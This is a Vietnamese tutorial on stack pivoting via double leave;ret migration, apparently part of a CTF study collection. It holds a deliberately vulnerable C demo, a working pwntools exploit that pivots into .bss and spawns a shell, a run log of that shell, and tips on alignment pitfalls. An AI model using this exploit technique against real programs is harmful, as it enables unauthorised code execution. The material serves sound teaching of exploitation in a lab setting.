# Stack pivot — rẽ `rsp` sang vùng ta kiểm soát

> Tài liệu học sâu. Demo & exploit dưới đây **tự biên dịch + verify ra shell** (pwntools 4.15).
> Nguồn tham khảo ở cuối.

---

## 1. Khi nào cần pivot?

ROP chain nằm ngay chỗ tràn. Nhưng nhiều lúc **chỗ tràn quá chật**:
- Buffer nhỏ, `read`/`gets` chỉ cho ghi đè vài qword sau `ret` → **không đủ chứa cả chain**.
- Bài cho **đọc chain vào một vùng khác** (bss) trước, cần "nhảy" thực thi sang đó.
- Sau **partial overwrite** chỉ control được `rsp` lệch chút, muốn dời hẳn sang stack giả.

**Stack pivot** = đổi `rsp` trỏ sang **vùng ta đã đặt sẵn chain** (thường `.bss`), rồi ROP tiếp
ở đó như chưa có gì xảy ra.

> Nói ngắn: *không nhét vừa chain ở chỗ tràn → ghi chain vào bss, rồi lừa `rsp` nhảy sang bss.*

---

## 2. Các gadget pivot (ngữ nghĩa từng loại)

| Gadget | Hiệu ứng | Ghi chú |
|--------|----------|---------|
| `pop rsp ; ret` | `rsp = qword kế trong chain` | **sạch nhất** nếu có |
| `leave ; ret` | `rsp = rbp ; pop rbp ; ret` | cần control `rbp`; dùng kiểu "migration" (xem §3) |
| `xchg <reg>, rsp ; ret` | tráo `rsp` với reg | set reg = đích trước |
| `add rsp, N ; ret` | dời `rsp` thêm N | chỉ để **bỏ qua** N byte rác, không nhảy xa |
| `mov rsp, reg` (hiếm) | gán thẳng | ít gặp trong gadget tự nhiên |

pwntools gói sẵn `rop.migrate(addr)` dựng pivot `leave;ret` tự động (xem
[rop.md](pwntools/rop.md#migrate--stack-pivot)).

---

## 3. Cơ chế `leave; ret` (migration) — vẽ ra cho dễ

`leave` = `mov rsp, rbp ; pop rbp`. Nếu ta control **saved `rbp`** (ghi đè nó = địa chỉ bss
`PIV`) và cho `ret` nhảy vào **một gadget `leave; ret` nữa**, thì xảy ra "double leave":

```
Hàm vuln kết thúc:  leave ; ret
   leave : rsp = rbp(buf) ; pop rbp  -> rbp = saved_rbp = PIV   (ta ghi đè)
   ret   : rip = [ret slot] = địa chỉ gadget 'leave; ret'

Gadget leave;ret chạy:
   leave : rsp = rbp = PIV ; pop rbp -> rbp = [PIV]       (qword rác)
   ret   : rip = [PIV+8]  -> gadget đầu của chain ở bss ; rsp = PIV+0x10
                                     ^ từ đây ROP chạy tiếp trong bss
```

Bố cục cần ghi:
- **Chỗ tràn:** `pad → saved_rbp = PIV → ret = &(leave;ret)`.
- **Tại bss (PIV):** `[PIV] = rác (bị pop vào rbp)`, `[PIV+8] = gadget đầu`, `[PIV+0x10] = …`.

---

## 4. Demo verified (tự biên dịch, chạy ra shell)

```c
// pivotdemo.c  —  gcc -no-pie -fno-stack-protector pivotdemo.c -o pivotdemo
char chain[0x2000];                // bss ĐÃ BIẾT địa chỉ (no-PIE); ĐỦ LỚN (xem bẫy §5)
void win(){ system("/bin/sh"); }
int main(){
  char buf[0x20];
  setbuf(stdout,0); setbuf(stdin,0);
  puts("stage1 chain:");   read(0, chain, 0x2000);  // nạp chain vào bss
  puts("stage2 overflow:"); read(0, buf, 0x40);     // tràn NHỎ: chỉ đủ pivot
  return 0;
}
```

Gadget (verify): `leave;ret = 0x401236`, `ret = 0x40101a`, `win = 0x401196`, `chain = 0x404060`.
Offset tới `ret` của stage 2 = **40** (`buf[0x20]` + saved `rbp` 8). `saved_rbp` ở **offset 32**.

**exploit.py (pwnld-style):**
```python
#!/usr/bin/env python3
from pwn import *
from pwnld import *

context.binary = exe = ELF("./pivotdemo", checksec=False)
set_remote("host", 0)
p = start()

LEAVE = 0x401236          # leave ; ret  (gadget migration)
WIN   = 0x401196          # win(): system("/bin/sh")
RET   = 0x40101a          # ret          (căn 16-byte cho system)
CHAIN = 0x404060          # bss chain[]
PIV   = CHAIN + 0x1800    # pivot vào ĐIỂM CAO -> chừa ~6KB bên dưới cho system (bẫy §5)

# Stage 1: đặt chain tại PIV. [PIV]=rác(->rbp), [PIV+8]=RET(căn lề), [PIV+0x10]=WIN
sa("stage1 chain:", (b"\x00"*0x1800 + flat(0xdead, RET, WIN)).ljust(0x2000, b"\x00"))

# Stage 2: tràn nhỏ -> saved_rbp=PIV, ret=LEAVE  => double-leave pivot sang PIV
sa("stage2 overflow:", flat(b"A"*0x20, PIV, LEAVE))

ia()
```

**Log chạy thật:**
```
$ id
uid=1000(ld) gid=1000(ld) groups=1000(ld),4(adm),...      <- có shell
```

---

## 5. Hai cạm bẫy (đều verify được trên demo)

1. **Pivot vào ĐIỂM CAO, chừa chỗ bên dưới.** `rsp` sau pivot sẽ **mọc xuống** (push/call đẩy
   `rsp` giảm dần). Nếu pivot vào *đầu* buffer bss, `system`/`do_system` (ngốn ~2.5KB stack) sẽ
   đẩy `rsp` **tụt xuống ngoài vùng ghi được → SIGSEGV**. Kiểm chứng: pivot đầu `chain[0x400]` →
   crash `fault_addr == rsp` trong `do_system`; đổi `chain[0x2000]` + pivot `+0x1800` → **shell**.
   → Pivot vào **gần đỉnh** một vùng đủ lớn, hoặc tránh gọi hàm nặng (dùng `execve` syscall).
2. **Căn lề 16-byte.** Vào `system` lệch 16-byte → crash tại `movaps`. Demo cần **đúng 1** `ret`
   (`RET`) trước `win` (k=0 và k=2 đều crash, k=1 ra shell). Dấu hiệu: crash *trong* libc, địa chỉ
   hợp lệ (xem thêm [rop.md](pwntools/rop.md), [ret2csu.md](ret2csu.md#11-writeup-mẫu--bof_ret2csu-phong-cách-pwnld-đã-verify-ra-shell)).

---

## 6. Dùng pwntools `rop.migrate`

```python
rop = ROP(exe)
rop.raw(...)                     # chain phần 1 (ở chỗ tràn)
rop.migrate(bss_addr)            # tự dựng: set rbp + leave;ret -> rsp = bss_addr
# chain phần 2 build riêng, đặt tại bss_addr
```
`migrate` lo phần `leave;ret`; bạn vẫn tự lo **đặt chain phần 2 tại `bss_addr`** và **cạm bẫy §5**.

---

## 7. Khi nào pivot vs kỹ thuật khác

- Chỗ tràn **chật** nhưng ghi được chain ở nơi khác (bss, đã leak stack) → **pivot**.
- Chain dài + có **2 lần nhập** → nhập chain vào bss, pivot sang.
- Kết hợp: thường đi với [ret2csu](ret2csu.md) (gọi `read`/`gets` ghi chain vào bss khi thiếu
  `pop rdi`) hoặc [ret2libc](pwntools/rop.md). Pivot là *bước dời*, không phải mục tiêu cuối.

---

## 8. Danh sách bài tập + gợi ý

| Bài | Mức | Học gì | Gợi ý |
|-----|-----|--------|-------|
| **demo §4** | ⭐ | `leave;ret` migration, pivot cao, căn lề | exploit §4 verify ra shell |
| **`BOF_Stack_Pivot_Variable_Change`** (bof9) | ⭐⭐ | fake saved-rbp đổi biến qua `leave;ret` | có `solve.py` sẵn trong thư mục |
| **`BOF_Stack_Pivot_Flow_Redirect`** (bof8) | ⭐⭐ | pivot rồi rẽ luồng (menu) | disasm `main` tìm chỗ ghi + con trỏ hàm |
| **`advance/ret2libc_and_Stack_Pivot`** | ⭐⭐⭐ | pivot + ret2libc, binary **thiếu `pop rdi`** → ghép [ret2csu](ret2csu.md)/[ret2dlresolve](pwntools/rop.md#ret2dlresolve) | `gets` tràn vô hạn; dùng csu gọi `gets(bss)` (bss < 4GB nên `edi` đủ) rồi pivot |

**Lộ trình:** demo §4 (nắm double-leave) → bof9 (fake rbp) → bof8 (pivot + rẽ luồng) →
ret2libc_stackpivot (pivot + csu/dlresolve — bài tổng hợp nặng nhất).

---

## Nguồn tham khảo

- ir0nstone — *Stack Pivoting*:
  <https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting>
- HackTricks — *Stack Pivoting / EBP2Ret*:
  <https://book.hacktricks.xyz/binary-exploitation/stack-overflow/stack-pivoting-ebp2ret-ebp-chaining>
- Tra nhanh API: [`pwntools/rop.md` §migrate](pwntools/rop.md#migrate--stack-pivot)
